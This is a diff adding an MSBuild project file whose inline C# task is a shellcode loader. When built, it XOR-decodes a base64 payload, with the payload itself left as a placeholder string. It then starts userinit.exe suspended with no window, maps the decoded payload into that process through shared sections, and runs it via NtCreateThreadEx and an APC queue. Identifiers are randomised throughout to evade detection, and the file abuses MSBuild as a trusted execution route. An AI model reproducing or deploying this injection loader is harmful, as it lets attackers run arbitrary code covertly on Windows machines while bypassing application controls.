@@ -1,0 +1,591 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+	<Target Name="pKNSDHEuzs">
+		<poiMkBalTRP />
+	</Target>
+		<UsingTask
+		TaskName="poiMkBalTRP"
+		TaskFactory="CodeTaskFactory"
+		AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+			<Task>
+				<Code Type="Class" Language="cs">
+					<![CDATA[
+						using System;
+						using System.Text;
+						using System.Linq;
+						using System.Diagnostics;
+						using System.Runtime.InteropServices;
+						using System.Threading;
+						using Microsoft.Build.Framework;
+						using Microsoft.Build.Utilities;
+
+						public class poiMkBalTRP : Task, ITask {
+						
+						      [System.Flags]
+						        public enum ProcessAccessFlags : uint
+						        {
+						            All = 0x001F0FFF,
+						            Terminate = 0x00000001,
+						            CreateThread = 0x00000002,
+						            VirtualMemoryOperation = 0x00000008,
+						            VirtualMemoryRead = 0x00000010,
+						            VirtualMemoryWrite = 0x00000020,
+						            DuplicateHandle = 0x00000040,
+						            CreateProcess = 0x000000080,
+						            SetQuota = 0x00000100,
+						            SetInformation = 0x00000200,
+						            QueryInformation = 0x00000400,
+						            QueryLimitedInformation = 0x00001000,
+						            Synchronize = 0x00100000
+						        }
+
+						        [System.Flags]
+						        public enum ProcessCreationFlags : uint
+						        {
+						            ZERO_FLAG = 0x00000000,
+						            CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
+						            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
+						            CREATE_NEW_CONSOLE = 0x00000010,
+						            CREATE_NEW_PROCESS_GROUP = 0x00000200,
+						            CREATE_NO_WINDOW = 0x08000000,
+						            CREATE_PROTECTED_PROCESS = 0x00040000,
+						            CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
+						            CREATE_SEPARATE_WOW_VDM = 0x00001000,
+						            CREATE_SHARED_WOW_VDM = 0x00001000,
+						            CREATE_SUSPENDED = 0x00000004,
+						            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
+						            DEBUG_ONLY_THIS_PROCESS = 0x00000002,
+						            DEBUG_PROCESS = 0x00000001,
+						            DETACHED_PROCESS = 0x00000008,
+						            EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
+						            INHERIT_PARENT_AFFINITY = 0x00010000
+						        }
+
+						        public struct PROCESS_INFORMATION
+						        {
+						            public System.IntPtr hProcess;
+						            public System.IntPtr hThread;
+						            public uint dwProcessId;
+						            public uint dwThreadId;
+						        }
+
+						        public struct STARTUPINFO
+						        {
+						            public uint cb;
+						            public string lpReserved;
+						            public string lpDesktop;
+						            public string lpTitle;
+						            public uint dwX;
+						            public uint dwY;
+						            public uint dwXSize;
+						            public uint dwYSize;
+						            public uint dwXCountChars;
+						            public uint dwYCountChars;
+						            public uint dwFillAttribute;
+						            public uint dwFlags;
+						            public short wShowWindow;
+						            public short cbReserved2;
+						            public System.IntPtr lpReserved2;
+						            public System.IntPtr hStdInput;
+						            public System.IntPtr hStdOutput;
+						            public System.IntPtr hStdError;
+						        }
+
+						        [System.Flags]
+						        public enum ThreadAccess : int
+						        {
+						            TERMINATE = (0x0001),
+						            SUSPEND_RESUME = (0x0002),
+						            GET_CONTEXT = (0x0008),
+						            SET_CONTEXT = (0x0010),
+						            SET_INFORMATION = (0x0020),
+						            QUERY_INFORMATION = (0x0040),
+						            SET_THREAD_TOKEN = (0x0080),
+						            IMPERSONATE = (0x0100),
+						            DIRECT_IMPERSONATION = (0x0200)
+						        }
+
+
+						        [StructLayout(LayoutKind.Sequential)]
+						        public struct PROC_VALIDATION
+						        {
+						            public Boolean isvalid;
+						            public String sName;
+						            public IntPtr hProc;
+						            public IntPtr pNtllBase;
+						            public Boolean isWow64;
+						        }
+
+						        [StructLayout(LayoutKind.Sequential)]
+						        public struct SC_DATA
+						        {
+						            public UInt32 iSize;
+						            public byte[] bScData;
+						        }
+
+						        [StructLayout(LayoutKind.Sequential)]
+						        public struct SECT_DATA
+						        {
+						            public Boolean isvalid;
+						            public IntPtr hSection;
+						            public IntPtr pBase;
+						        }
+
+						        [StructLayout(LayoutKind.Sequential)]
+						        public struct UNICODE_STRINGG
+						        {
+						            public UInt16 Length;
+						            public UInt16 MaximumLength;
+						            public IntPtr Buffer;
+						        }
+
+						        [StructLayout(LayoutKind.Sequential)]
+						        public struct ANSI_STRING
+						        {
+						            public UInt16 Length;
+						            public UInt16 MaximumLength;
+						            public IntPtr Buffer;
+						        }
+
+						        [StructLayout(LayoutKind.Sequential)]
+						        public struct CLIENT_ID
+						        {
+						            public IntPtr UniqueProcess;
+						            public IntPtr UniqueThread;
+						        }
+
+						        [StructLayout(LayoutKind.Sequential)]
+						        public class THREAD_BASIC_INFORMATION
+						        {
+						            public UInt32 ExitStatus;
+						            public IntPtr TebBaseAddress;
+						            public CLIENT_ID ClientId;
+						            public UIntPtr AffinityMask;
+						            public int Priority;
+						            public int BasePriority;
+						        }
+
+						        [StructLayout(LayoutKind.Sequential, Pack = 0)]
+						        public struct OBJECT_ATTRIBUTES
+						        {
+						            public Int32 Length;
+						            public IntPtr RootDirectory;
+						            public IntPtr ObjectName;
+						            public uint Attributes;
+						            public IntPtr SecurityDescriptor;
+						            public IntPtr SecurityQualityOfService;
+						        }
+
+						        [StructLayout(LayoutKind.Sequential)]
+						        public struct SystemInfo
+						        {
+						            public CPUArch CPUArch;
+						            public uint PageSize;
+						            public IntPtr MinimumApplicationAddress;
+						            public IntPtr MaximumApplicationAddress;
+						            public IntPtr ActiveProcessorMask;
+						            public uint NumberOfProcessors;
+						            public uint ProcessorType;
+						            public uint AllocationGranularity;
+						            public ushort ProcessorLevel;
+						            public ushort ProcessorRevision;
+						        }
+
+						        [StructLayout(LayoutKind.Sequential)]
+						        public struct MEMORY_BASIC_INFORMATION
+						        {
+						            public IntPtr BaseAddress;
+						            public IntPtr AllocationBase;
+						            public uint AllocationProtect;
+						            public IntPtr RegionSize;
+						            public uint State;
+						            public uint Protect;
+						            public uint Type;
+						        }
+
+						        public enum CPUArch
+						        {
+						            x86 = 0,
+						            x64 = 9,
+						            ARM = -1,
+						        }
+
+						        [System.Runtime.InteropServices.DllImport("ntdll.dll")]
+						        public static extern UInt32 NtOpenProcess(
+						            ref IntPtr ProcessHandle,
+						            UInt32 DesiredAccess,
+						            ref OBJECT_ATTRIBUTES ObjectAttributes,
+						            ref CLIENT_ID ClientId);
+
+						        [System.Runtime.InteropServices.DllImport("ntdll.dll")]
+						        public static extern UInt32 NtQueryInformationProcess(
+						            IntPtr processHandle,
+						            UInt32 processInformationClass,
+						            ref ulong processInformation,
+						            int processInformationLength,
+						            ref UInt32 returnLength);
+
+						        [System.Runtime.InteropServices.DllImport("ntdll.dll")]
+						        public static extern UInt32 NtCreateSection(
+						            ref IntPtr section,
+						            UInt32 desiredAccess,
+						            IntPtr pAttrs,
+						            ref long MaxSize,
+						            uint pageProt,
+						            uint allocationAttribs,
+						            IntPtr hFile);
+
+						        [System.Runtime.InteropServices.DllImport("ntdll.dll")]
+						        public static extern UInt32 NtMapViewOfSection(
+						            IntPtr SectionHandle,
+						            IntPtr ProcessHandle,
+						            ref IntPtr BaseAddress,
+						            IntPtr ZeroBits,
+						            IntPtr CommitSize,
+						            ref long SectionOffset,
+						            ref long ViewSize,
+						            uint InheritDisposition,
+						            uint AllocationType,
+						            uint Win32Protect);
+
+						        [System.Runtime.InteropServices.DllImport("ntdll.dll")]
+						        public static extern UInt32 NtUnmapViewOfSection(
+						            IntPtr ProcessHandle,
+						            IntPtr BaseAddress);
+
+						        [System.Runtime.InteropServices.DllImport("ntdll.dll")]
+						        public static extern UInt32 NtQueueApcThread(
+						             IntPtr ThreadHandle,
+						             IntPtr ApcRoutine,
+						             IntPtr ApcArgument1,
+						             IntPtr ApcArgument2,
+						             IntPtr ApcArgument3);
+
+						        [System.Runtime.InteropServices.DllImport("ntdll.dll")]
+						        public static extern UInt32 NtCreateThreadEx(
+						            ref IntPtr hThread,
+						            UInt32 DesiredAccess,
+						            IntPtr ObjectAttributes,
+						            IntPtr ProcessHandle,
+						            IntPtr lpStartAddress,
+						            IntPtr lpParameter,
+						            bool CreateSuspended,
+						            UInt32 StackZeroBits,
+						            UInt32 SizeOfStackCommit,
+						            UInt32 SizeOfStackReserve,
+						            IntPtr lpBytesBuffer);
+
+						        [System.Runtime.InteropServices.DllImport("ntdll.dll")]
+						        public static extern void RtlInitUnicodeString(
+						            ref UNICODE_STRINGG DestinationString,
+						            [MarshalAs(UnmanagedType.LPWStr)]
+						            string SourceString);
+
+						        [System.Runtime.InteropServices.DllImport("ntdll.dll")]
+						        public static extern UInt32 RtlUnicodeStringToAnsiString(
+						            ref ANSI_STRING DestinationString,
+						            ref UNICODE_STRINGG SourceString,
+						            bool AllocateDestinationString);
+
+						        [System.Runtime.InteropServices.DllImport("ntdll.dll")]
+						        public static extern UInt32 LdrGetDllHandle(
+						            IntPtr DllPath,
+						            IntPtr DllCharacteristics,
+						            ref UNICODE_STRINGG DllName,
+						            ref IntPtr DllHandle);
+
+						        [System.Runtime.InteropServices.DllImport("ntdll.dll")]
+						        public static extern UInt32 LdrGetProcedureAddress(
+						            IntPtr hModule,
+						            ref ANSI_STRING ModName,
+						            UInt32 Ordinal,
+						            ref IntPtr FunctionAddress);
+
+						        [System.Runtime.InteropServices.DllImport("ntdll.dll")]
+						        public static extern UInt32 NtAlertResumeThread(
+						            IntPtr ThreadHandle,
+						            ref UInt32 PreviousSuspendCount);
+
+						        [System.Runtime.InteropServices.DllImport("ntdll.dll")]
+						        public static extern UInt32 NtQueryInformationThread(
+						            IntPtr ThreadHandle,
+						            int ThreadInformationClass,
+						            IntPtr ThreadInformation,
+						            int ThreadInformationLength,
+						            ref int ReturnLength);
+
+						        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
+						        public static extern bool CreateProcess(
+						        string lpApplicationName,
+						        string lpCommandLine,
+						        System.IntPtr lpProcessAttributes,
+						        System.IntPtr lpThreadAttributes,
+						        bool bInheritHandles,
+						        ProcessCreationFlags dwCreationFlags,
+						        System.IntPtr lpEnvironment,
+						        string lpCurrentDirectory,
+						        ref STARTUPINFO lpStartupInfo,
+						        out PROCESS_INFORMATION lpProcessInformation
+						        );
+
+						        [System.Runtime.InteropServices.DllImport("psapi.dll", SetLastError = true)]
+						        public static extern uint GetMappedFileName(IntPtr m_hProcess, IntPtr lpv, StringBuilder lpFilename, uint nSize);
+
+						        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
+						        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+
+						        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
+						        static extern void GetSystemInfo(out SystemInfo lpSystemInfo);
+
+						        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
+						        static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, int dwLength);
+						     
+						
+
+							public override bool Execute()
+							{
+								
+					
+								System.Text.StringBuilder nhbGRP = new System.Text.StringBuilder();
+								nhbGRP.Append("XORED PAYLOAD BASE64 STRING HERE");
+								
+								    System.String nhyTWT = @"C:\Windows\System32\userinit.exe";
+
+									byte[] NBXiuiLP = System.Convert.FromBase64String(nhbGRP.ToString());
+								    System.String qlYxUNkwy = "MQICB9YU94AFMEIWNXM3";
+								    byte[] MMBVZ = System.Text.Encoding.ASCII.GetBytes(qlYxUNkwy);
+								    for(int i=0; i < NBXiuiLP.Length; i++)
+								        NBXiuiLP[i] = ((byte)(NBXiuiLP[i] ^ MMBVZ[(i % MMBVZ.Length)]));
+								    
+
+								    STARTUPINFO si = new STARTUPINFO();
+								    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+								    bool success = CreateProcess(nhyTWT, null, System.IntPtr.Zero, System.IntPtr.Zero, false, ProcessCreationFlags.CREATE_SUSPENDED | ProcessCreationFlags.CREATE_NO_WINDOW, System.IntPtr.Zero, null, ref si, out pi);
+								    
+
+
+								            Int32 ProcId = (int)pi.dwProcessId;
+								            PROC_VALIDATION NBXVD = new PROC_VALIDATION();
+								            try
+								            {
+								                Process Proc = Process.GetProcessById(ProcId);
+								                string LIPEHRYzzF = "\\ntdll.dll";
+								                IntPtr fweaSDEWR = IntPtr.Zero;
+								                SystemInfo NBYEUpps;
+								                GetSystemInfo(out NBYEUpps);
+								                IntPtr BYWTSDOK = IntPtr.Zero;
+								                bool twyegOOS = false;
+								                ulong bytrwAljJzSW = (ulong)NBYEUpps.MaximumApplicationAddress;
+								                IntPtr WWqIVG = OpenProcess(0x0400 | 0x0010, false, ProcId);
+								                IntPtr BVUYWEIDzx = IntPtr.Zero;
+								                int OjBxKjMbfCK = Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION));
+								                MEMORY_BASIC_INFORMATION wytRGFp;
+								                int result = VirtualQueryEx(WWqIVG, BVUYWEIDzx, out wytRGFp, OjBxKjMbfCK);
+								                while (result != 0 && (ulong)BVUYWEIDzx < bytrwAljJzSW)
+								                {
+								                    BVUYWEIDzx = new IntPtr(wytRGFp.BaseAddress.ToInt64() + wytRGFp.RegionSize.ToInt64());
+								                    StringBuilder vMTxDLuFusIZh = new StringBuilder(250);
+								                    uint fhblLjYDLHnrw = GetMappedFileName(WWqIVG, wytRGFp.BaseAddress, vMTxDLuFusIZh, 254);
+								                    if (fhblLjYDLHnrw > 0 && vMTxDLuFusIZh.ToString().Contains(LIPEHRYzzF) && !twyegOOS)
+								                    {
+								                        BYWTSDOK = IntPtr.Subtract(BVUYWEIDzx, 4096);
+								                        twyegOOS = true;
+								                    }
+
+								                    result = VirtualQueryEx(WWqIVG, BVUYWEIDzx, out wytRGFp, OjBxKjMbfCK);
+								                }
+								                NBXVD.pNtllBase = BYWTSDOK;
+
+								                NBXVD.isvalid = true;
+								                NBXVD.sName = Proc.ProcessName;
+
+								                IntPtr hProc = IntPtr.Zero;
+								                OBJECT_ATTRIBUTES VKeoKyJzDznYn = new OBJECT_ATTRIBUTES();
+								                CLIENT_ID uwyHgdf = new CLIENT_ID();
+								                uwyHgdf.UniqueProcess = (IntPtr)ProcId;
+								                UInt32 CallResult = NtOpenProcess(ref hProc, 0x1F0FFF, ref VKeoKyJzDznYn, ref uwyHgdf);
+								                NBXVD.hProc = hProc;
+
+								                ulong isWow64 = 0;
+								                uint XZfaoVTTpfKh = 0;
+								                NtQueryInformationProcess(NBXVD.hProc, 26, ref isWow64, Marshal.SizeOf(isWow64), ref XZfaoVTTpfKh);
+								                if (isWow64 == 0)
+								                {
+								                    NBXVD.isWow64 = false;
+								                }
+								                else
+								                {
+								                    NBXVD.isWow64 = true;
+								                }
+								            }
+								            catch
+								            {
+								                NBXVD.isvalid = false;
+								            }
+
+								            if (!NBXVD.isvalid || NBXVD.hProc == IntPtr.Zero)
+								            {
+								                if (!NBXVD.isvalid)
+								                {
+								                }
+								                else
+								                {
+								                }
+
+								            }
+								            else
+								            {
+								                if (NBXVD.isWow64)
+								                {
+								                }
+
+								                SC_DATA bywuOSKD = new SC_DATA();
+								                try
+								                {
+								                    bywuOSKD.bScData = NBXiuiLP;
+								                    bywuOSKD.iSize = (uint)bywuOSKD.bScData.Length;
+								                }
+								                catch { }
+
+								                if (bywuOSKD.iSize == 0)
+								                {
+								                }
+
+								                SECT_DATA UIPQhxwpOZT;
+
+								                SECT_DATA xlZfVIzcHWt = new SECT_DATA();
+
+								                long MaxSize = bywuOSKD.iSize;
+								                IntPtr hSection = IntPtr.Zero;
+								                UInt32 CallResult = NtCreateSection(ref hSection, 0xe, IntPtr.Zero, ref MaxSize, 0x40, 0x8000000, IntPtr.Zero);
+								                if (CallResult == 0 && hSection != IntPtr.Zero)
+								                {
+								                    xlZfVIzcHWt.hSection = hSection;
+								                }
+								                else
+								                {
+								                    xlZfVIzcHWt.isvalid = false;
+								                    UIPQhxwpOZT = xlZfVIzcHWt;
+								                }
+
+								                IntPtr pScBase = IntPtr.Zero;
+								                long lSecOffset = 0;
+								                CallResult = NtMapViewOfSection(hSection, (IntPtr)(-1), ref pScBase, IntPtr.Zero, IntPtr.Zero, ref lSecOffset, ref MaxSize, 0x2, 0, 0x4);
+								                if (CallResult == 0 && pScBase != IntPtr.Zero)
+								                {
+								                    xlZfVIzcHWt.pBase = pScBase;
+								                    UIPQhxwpOZT = xlZfVIzcHWt;
+								                }
+								                else
+								                {
+								                    xlZfVIzcHWt.isvalid = false;
+								                    UIPQhxwpOZT = xlZfVIzcHWt;
+								                }
+
+								                xlZfVIzcHWt.isvalid = true;
+								                UIPQhxwpOZT = xlZfVIzcHWt;
+
+								                if (!UIPQhxwpOZT.isvalid)
+								                {
+								                }
+
+								                SECT_DATA UjiYfL;
+								                SECT_DATA guHunenkgmieKP = new SECT_DATA();
+
+								                IntPtr pScBasee = IntPtr.Zero;
+								                long lSecOffsett = 0;
+								                long rVcElZt = bywuOSKD.iSize;
+								                UInt32 CallResultt = NtMapViewOfSection(UIPQhxwpOZT.hSection, NBXVD.hProc, ref pScBase, IntPtr.Zero, IntPtr.Zero, ref lSecOffset, ref rVcElZt, 0x2, 0, 0x20);
+								                if (CallResult == 0 && pScBase != IntPtr.Zero)
+								                {
+								                    guHunenkgmieKP.pBase = pScBase;
+								                    UjiYfL = guHunenkgmieKP;
+								                }
+								                else
+								                {
+								                    guHunenkgmieKP.isvalid = false;
+								                    UjiYfL = guHunenkgmieKP;
+								                }
+
+								                guHunenkgmieKP.isvalid = true;
+								                UjiYfL = guHunenkgmieKP;
+
+								                if (!UjiYfL.isvalid)
+								                {
+								                }
+
+								                Marshal.Copy(bywuOSKD.bScData, 0, UIPQhxwpOZT.pBase, (int)bywuOSKD.iSize);
+
+
+								                IntPtr BJLSDIekL;
+								                UNICODE_STRINGG NBhdlax = new UNICODE_STRINGG();
+								                string Module = "ntdll.dll";
+								                string Export = "RtlExitUserThread";
+								                RtlInitUnicodeString(ref NBhdlax, Module);
+								                IntPtr hModule = IntPtr.Zero;
+								                UInt32 dqCBdgeeACUFII = LdrGetDllHandle(IntPtr.Zero, IntPtr.Zero, ref NBhdlax, ref hModule);
+								                if (dqCBdgeeACUFII != 0 || hModule == IntPtr.Zero)
+								                {
+								                }
+								                else
+								                {
+								                }
+
+								                UNICODE_STRINGG wGOoqRiqUQH = new UNICODE_STRINGG();
+								                RtlInitUnicodeString(ref wGOoqRiqUQH, Export);
+								                ANSI_STRING zdOYDUlflydnE = new ANSI_STRING();
+								                RtlUnicodeStringToAnsiString(ref zdOYDUlflydnE, ref wGOoqRiqUQH, true);
+								                IntPtr CBHlUYWg = IntPtr.Zero;
+								                CallResult = LdrGetProcedureAddress(hModule, ref zdOYDUlflydnE, 0, ref CBHlUYWg);
+
+								                if (CallResult != 0 || CBHlUYWg == IntPtr.Zero)
+								                {
+								                    BJLSDIekL = IntPtr.Zero;
+								                }
+								                else
+								                {
+								                }
+
+								                IntPtr FuncOffset = (IntPtr)((Int64)(CBHlUYWg) - (Int64)(hModule));
+								                BJLSDIekL = FuncOffset;
+
+								                if (BJLSDIekL == IntPtr.Zero)
+								                {
+								                }
+
+								                IntPtr BdhCmhL = IntPtr.Zero;
+								                IntPtr CohTgQDzRjphBD = (IntPtr)((Int64)NBXVD.pNtllBase + (Int64)BJLSDIekL);
+								                UInt32 CallResulttt = NtCreateThreadEx(ref BdhCmhL, 0x1FFFFF, IntPtr.Zero, NBXVD.hProc, CohTgQDzRjphBD, IntPtr.Zero, true, 0, 0xffff, 0xffff, IntPtr.Zero);
+								                if (BdhCmhL == IntPtr.Zero)
+								                {
+								                }
+								                else
+								                {
+								                }
+
+								                CallResult = NtQueueApcThread(BdhCmhL, UjiYfL.pBase, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
+								                if (CallResult == 0)
+								                {
+								                }
+								                else
+								                {
+								                }
+
+								                UInt32 RbmemTOXJBiaY = 0;
+								                CallResult = NtAlertResumeThread(BdhCmhL, ref RbmemTOXJBiaY);
+								                if (CallResult == 0)
+								                {
+								                }
+								                else
+								                {
+								                }
+
+								            }
+								
+							return true;
+							}
+					 }
+					]]>
+						</Code>
+			</Task>
+		</UsingTask>
+</Project>
